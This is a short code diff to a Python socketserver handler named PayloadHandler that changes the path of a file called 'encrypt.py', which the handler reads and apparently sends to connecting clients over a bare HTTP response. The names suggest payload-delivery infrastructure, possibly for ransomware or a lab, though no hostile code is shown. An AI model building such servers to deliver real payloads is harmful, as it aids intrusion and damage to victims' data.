@@ -30,7 +30,7 @@ class PayloadHandler(socketserver.StreamRequestHandler):
         
     
     def handle(self) -> None:
-        with open("../encrypt.py", mode = 'rb') as payload:
+        with open("encrypt.py", mode = 'rb') as payload:
             self.payload = payload.read()
         self.data = self.request.recv(16)
         self.request.send(b"HTTP/1.1 200 OK\r\n")
